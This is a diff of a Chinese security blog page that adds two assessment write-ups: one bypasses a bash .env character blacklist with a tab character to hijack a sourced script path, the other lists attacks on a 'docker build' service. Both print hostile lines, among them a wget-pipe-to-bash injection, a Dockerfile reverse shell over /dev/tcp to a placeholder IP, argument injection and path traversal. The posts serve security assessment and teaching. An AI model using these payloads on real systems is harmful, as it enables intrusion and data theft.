-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
-<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
-<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-2021%E5%B9%B4%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1288,8 +1067,220 @@
 
 
 
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
+<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
+<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
+
+<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
+<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
+<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
+<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
+
+<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
+<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>结果 \x09 也就是 \t 可以生成新变量。</p>
+<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
+<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
+<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
+<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%22docker%20build%22%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%22docker%20build%22%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">docker build时的安全问题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-01-17 23:38:43" itemprop="dateModified" datetime="2022-01-17T23:38:43+08:00">2022-01-17</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>业务提供一个功能：根据用户的代码仓库编译镜像，并且管理镜像。</p>
+<p>编译镜像时的业务实现类似下面这样，其中image_name_tag、dockerfile_file、dockerfile_path变量都是从外部web入口传入的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build $&#123;DOCKER_BUILD_ARG&#125; -t $&#123;image_name_tag&#125; -f $&#123;dockerfile_file&#125; $&#123;dockerfile_path&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果你是这个业务的研发或者安全测试人员，你觉得这里会产生哪些安全漏洞？</p>
+<h1 id="我的分析"><a href="#我的分析" class="headerlink" title="我的分析"></a>我的分析</h1><ul>
+<li><p>命令执行</p>
+<p>我想大家第一个都会想到”命令执行漏洞”：image_name_tag变量如果用户传入<code>`wget -c http://xxx/x.sh | bash -c`</code>就能执行远程服务器上的脚本，拿到宿主机服务器权限。</p>
+<p>如果研发大哥对传入的变量做了黑名单呢(比如判断是否包含<code>$</code>、<code>`</code>)，还有其他安全漏洞吗？</p>
+</li>
+<li><p>Dockerfile中反弹shell</p>
+<p><code>-f $&#123;dockerfile_file&#125;</code>这里Dockerfile的内容是用户可控的，所以也很容易想到：我们可以在Dockerfile中写任意命令，获取到”反弹shell”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Victor Coisne victor.coisne@dotcloud.com</span><br><span class="line">RUN echo &quot;while ((1));do sleep 1;&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xxxx 0&gt;&amp;1;done&quot; &gt;&gt; &#x2F;tmp&#x2F;1.sh    # x.x.x.x&#x2F;xxxx是ip和端口</span><br><span class="line">RUN bash &#x2F;tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure>
+<p>在”反弹shell”中我们可以尝试去访问”dockerd服务”所在的宿主机网络，或者宿主机能访问到的网络，然后可以去测试网络中的脆弱服务。</p>
+<p>如果研发大哥在这里用iptables对容器和宿主机网络做了隔离，还有其他安全漏洞吗？</p>
+</li>
+<li><p>用户数据泄漏</p>
+<p>Dockerfile中的第一行<code>FROM</code>如果我填写其他用户编译好的镜像名称，是不是有可能读到其他用户镜像呢？</p>
+<p>虽然”镜像名称”难猜中，但是这个风险确实是存在的。</p>
+<p>如果研发大哥在构建镜像并推送到镜像仓库后，然后用<code>docker rmi</code>清空本地的镜像缓存，就不存在这种风险了，那还有其他安全漏洞吗？</p>
+</li>
+<li><p>给所有镜像种个后门</p>
+<p>image_name_tag是编译后的镜像名，Dockerfile中的第一行<code>FROM</code>指令又需要一个基础镜像，那么是否存在如下可能：A用户使用的基础镜像是B用户build生成。如果存在这个可能，那一个恶意用户build生成带后门的nginx、ubuntu等基础镜像，就可以导致其他用户的生成镜像时都带上后门。</p>
+<p>测试后，发现”dockerd服务”默认会使用本地镜像，所以会出现上面的问题。</p>
+<blockquote>
+<p>  –pull=true|false</p>
+<pre><code>    Always attempt to pull a newer version of the image. The default is false.</code></pre>
+</blockquote>
+<p>如果研发大哥使用了<code>docker build --pull=true</code>每次拉取最新镜像，还有其他安全漏洞吗？</p>
+</li>
+<li><p>命令参数注入<code>--network host</code></p>
+<p>如果传入image_name_tag参数值是<code>xxx --network host</code>,可以达到<code>docker build xxx --network host</code>的效果，配合Dockerfile中反弹shell，可以让shell和”dockerd服务”处于同一个网络。这样iptables对容器和宿主机的网络隔离就不起作用了。</p>
+<p>当然你还可以注入<code>--build-arg</code>读宿主机环境变量，或者看看<code>docker build</code>还有没有其他的命令行参数可以拿来利用。</p>
+<p>如果研发大哥对参数值判断了，不允许<code>-</code>符号传入呢，还有其他安全漏洞吗？</p>
+</li>
+<li><p>服务数据泄漏</p>
+<p>下面的命令可以把”docker客户端”的<code>/tmp</code>、<code>../../</code>目录下的文件全部拷贝到”编译容器”中，配合Dockerfile中反弹shell，可以在shell中读到”docker客户端”机器上的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -f .&#x2F;Dockerfile &#x2F;tmp</span><br><span class="line">docker build -f .&#x2F;Dockerfile ..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>同时你可能需要用.dockersignore文件忽略某些文件或目录，避免一些大文件被拷贝到”编译容器”。</p>
+<p>所以如果用户传入dockerfile_path参数为<code>../../</code>这种形式的路径，是可以读到机器上的文件。</p>
+<p>如果研发大哥判断用户传入的参数，不允许出现<code>..</code>这种目录跳转，还有其他安全漏洞吗？</p>
+<p>emm，反正我想不到其他的攻击点了。</p>
+<p>另外我想补充说明一下，docker是一个cs架构的软件，所以在做漏洞利用时需要清楚我们是在谁的网络环境下、读谁的文件（谁指的是客户端还是服务端）</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了一个docker相关的安全评估的案例，包括其中的风险点和修复措施，希望你能有点收获。</p>
+<p>在做这个评估时，我的感受是：有时候业务评估非常依赖评估人员自身的经验，并且好像没有办法依赖一个方法论(比如stride)评估出所有风险点。</p>
+<p>PS：欢迎读者与我讨论、指正文章内容。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
   </nav>
 
 </div>
